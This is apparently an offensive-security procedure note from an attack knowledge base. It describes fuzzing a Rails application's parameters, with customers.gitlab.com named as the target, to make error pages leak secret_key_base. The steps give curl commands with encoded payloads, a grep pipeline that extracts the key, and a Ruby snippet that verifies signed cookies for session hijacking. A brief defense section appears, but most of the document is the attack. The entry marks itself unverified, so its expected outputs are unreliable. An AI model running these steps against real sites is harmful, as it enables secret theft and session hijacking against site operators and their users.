---
tags:
  - information-disclosure
  - rails
  - fuzzing
  - error-leak
  - cookie-manipulation
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
commands:
  - '[[commands/curl-fuzz-encoded-parameter]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Steal Web Session Cookie]]'
updated_at: '2025-12-14T17:25:18.284Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 2d5ee259-6756-428e-a736-f1aae8225472
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Steal Web Session Cookie]]'
---
# Fuzz-Parameters-to-Leak-Rails-Secret-Key-Base

## Summary

This procedure involves fuzzing input parameters in a Ruby on Rails web application with various encodings to trigger an internal error that exposes the secret_key_base token on an unauthenticated error page. The leaked token can then be used to decrypt and forge signed cookies, potentially leading to session hijacking, though remote code execution is prevented by JSON serialization in cookies.

## Description

In vulnerable Rails applications, improper error handling can reveal sensitive configuration details like the secret_key_base, a cryptographic key used for signing and encrypting cookies. By sending specially crafted inputs with encoded characters (e.g., malformed UTF-8 or invalid bytes), an attacker can cause a parsing exception that dumps the key in the error response. This attack targets public-facing endpoints without authentication, making it accessible from anywhere. Prerequisites include identifying a fuzziable parameter (e.g., via reconnaissance) and understanding basic web request crafting. Expected outcomes include token extraction and validation by attempting cookie decryption using Rails tools or libraries like ActiveSupport::MessageVerifier.

## Requirements

1. Network access to the target web application (e.g., customers.gitlab.com over HTTP/HTTPS)
2. Tools for sending HTTP requests (curl or browser-based proxy like Burp Suite)
3. Knowledge of common encodings (URL, UTF-8, Base64) and Rails error patterns
4. No authentication required, but avoid excessive requests to evade rate limits

## Defense

Defensive measures and detection strategies:

- Implement custom error pages that sanitize sensitive data from stack traces in production environments
- Use environment-specific secret_key_base (e.g., via Rails credentials) and monitor for leaks
- Enable web application firewall (WAF) rules to detect fuzzing patterns like rapid encoded parameter variations
- Log and alert on 500 errors with unusual payloads; rotate secrets immediately upon detection

## Objectives

1. Trigger and capture an error response disclosing the secret_key_base
2. Extract the token for use in cookie decryption attacks
3. Assess potential for session manipulation without enabling RCE

## Instructions

### Step 1: Identify and Baseline the Target Endpoint

**Context**: Locate a GET or POST endpoint with a parameter that processes user input, such as a search or filter field. Send a normal request to confirm functionality.

**Command** ([[commands/curl-fuzz-encoded-parameter]]):
```bash
curl -v "https://customers.gitlab.com/some-endpoint?param=test" -o baseline.html
```

> This command sends a basic request and saves the response. Expected output: A successful 200 response with normal page content. Use -v for headers and inspect for parameter handling.

### Step 2: Fuzz with Encoded Payloads

**Context**: Iterate through encodings to provoke a Rails parsing error. Focus on characters that might cause string decoding issues, like %C3%81 (UTF-8 accented) or \xFF (invalid).

**Command** ([[commands/curl-fuzz-encoded-parameter]]):
```bash
curl -v "https://customers.gitlab.com/some-endpoint?param=%C3%81" -o response1.html
echo "Check for secret_key_base in response1.html"
curl -v "https://customers.gitlab.com/some-endpoint?param=\xFF" -o response2.html
echo "Check for secret_key_base in response2.html"
```

> These commands test specific triggers. Expected output: A 500 Internal Server Error with a stack trace in the HTML body containing the secret_key_base (e.g., "secret_key_base: abc123..."). Grep for "secret_key_base" in responses to automate extraction.

### Step 3: Extract and Validate the Leaked Token

**Context**: Parse the error page for the token and verify its usability by attempting cookie decryption (requires Ruby environment with Rails gems).

**Command** ([[commands/curl-fuzz-encoded-parameter]]):
```bash
grep -i "secret_key_base" response*.html | cut -d ':' -f2 | tr -d ' "'
# In Ruby: require 'active_support'; verifier = ActiveSupport::MessageVerifier.new('extracted_key'); verifier.verify('signed_cookie_value')
```

> Expected output: The isolated hex token. Successful verification decrypts a known signed cookie, confirming impact for session hijacking.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Steal Web Session Cookie]]

### Sub-Techniques


## Commands Used

- [[commands/curl-fuzz-encoded-parameter]]

## Tools Used


## Tags

- information-disclosure
- rails
- fuzzing
- error-leak
